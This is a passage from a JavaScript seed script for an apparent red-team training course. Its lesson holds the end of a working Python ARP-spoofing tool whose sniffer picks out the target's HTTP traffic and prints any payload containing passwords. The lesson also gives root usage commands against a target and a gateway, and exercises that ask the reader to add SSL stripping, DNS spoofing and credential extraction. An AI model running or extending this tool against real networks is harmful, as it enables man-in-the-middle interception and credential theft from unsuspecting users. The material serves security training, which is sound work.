        self.interface = interface
        self.target_ip = target_ip

    def packet_callback(self, pkt):
        """Process intercepted packets"""
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst

            # Only show target's traffic
            if src == self.target_ip or dst == self.target_ip:
                proto = "???"
                info = ""

                if pkt.haslayer(TCP):
                    proto = "TCP"
                    sport = pkt[TCP].sport
                    dport = pkt[TCP].dport
                    info = f"{sport} -> {dport}"

                    # Detect HTTP
                    if pkt.haslayer(Raw):
                        payload = pkt[Raw].load
                        if b'HTTP' in payload or b'GET' in payload or b'POST' in payload:
                            proto = "HTTP"
                            # Look for interesting data
                            if b'password' in payload.lower() or b'passwd' in payload.lower():
                                print(f"\\n[!] CREDENTIALS DETECTED!")
                                print(payload.decode('utf-8', errors='ignore')[:500])

                elif pkt.haslayer(UDP):
                    proto = "UDP"
                    sport = pkt[UDP].sport
                    dport = pkt[UDP].dport
                    info = f"{sport} -> {dport}"

                    if dport == 53 or sport == 53:
                        proto = "DNS"

                print(f"[{proto}] {src} -> {dst} | {info}")

    def start(self):
        """Start sniffing"""
        print(f"[*] Starting packet capture on {self.interface}...")
        sniff(
            iface=self.interface,
            prn=self.packet_callback,
            store=False,
            filter=f"host {self.target_ip}"
        )


def main():
    parser = argparse.ArgumentParser(description='ARP Spoofer Clone')
    parser.add_argument('-i', '--interface', required=True,
                       help='Network interface')
    parser.add_argument('-t', '--target', required=True,
                       help='Target IP address')
    parser.add_argument('-g', '--gateway', required=True,
                       help='Gateway IP address')
    parser.add_argument('--interval', type=float, default=1.0,
                       help='Interval between ARP packets')
    parser.add_argument('--sniff', action='store_true',
                       help='Also sniff traffic')
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)

    spoofer = ARPSpoofer(
        args.interface,
        args.target,
        args.gateway,
        args.interval
    )

    if args.sniff:
        # Start sniffer in background
        sniffer = PacketSniffer(args.interface, args.target)
        sniff_thread = threading.Thread(target=sniffer.start, daemon=True)
        sniff_thread.start()

    spoofer.start()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Basic ARP spoofing
sudo python3 arpspoof_clone.py -i eth0 -t 192.168.1.100 -g 192.168.1.1

# With packet sniffing
sudo python3 arpspoof_clone.py -i eth0 -t 192.168.1.100 -g 192.168.1.1 --sniff
\`\`\`

### Exercises
1. Add HTTPS stripping (sslstrip functionality)
2. Add DNS spoofing capability
3. Add credential extraction for common protocols
4. Add pcap logging`, 1, now);

console.log('Seeded: Reimplement Red Team Tools - Part 1 (Network)');
console.log('  - 2 modules, 4 detailed tasks');

sqlite.close();
